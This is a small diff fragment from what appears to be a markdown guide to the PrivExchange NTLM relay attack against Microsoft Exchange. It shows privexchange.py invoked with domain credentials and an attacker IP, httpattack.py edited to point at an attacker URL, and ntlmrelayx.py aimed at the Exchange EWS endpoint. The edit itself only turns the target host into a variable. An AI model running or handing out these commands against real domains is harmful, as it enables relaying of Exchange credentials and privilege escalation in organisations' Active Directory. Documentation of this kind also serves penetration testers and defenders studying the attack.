@@ -29,7 +29,7 @@ privexchange.py -d "$DOMAIN" -u "$DOMAIN_USER" -p "$PASSWORD" -ah "$ATTACKER_IP"
 > sed -i 's/attacker_url = .*$/attacker_url = "$ATTACKER_URL"/' httpattack.py
 > cd /PATH/TO/impacket
 > pip3 install .
-> ntlmrelayx.py -t https://exchange.server.EWS/Exchange.asmx
+> ntlmrelayx.py -t "https://$EXCHANGE_HOST/EWS/Exchange.asmx"
 > ```
 
 > [!NOTE]
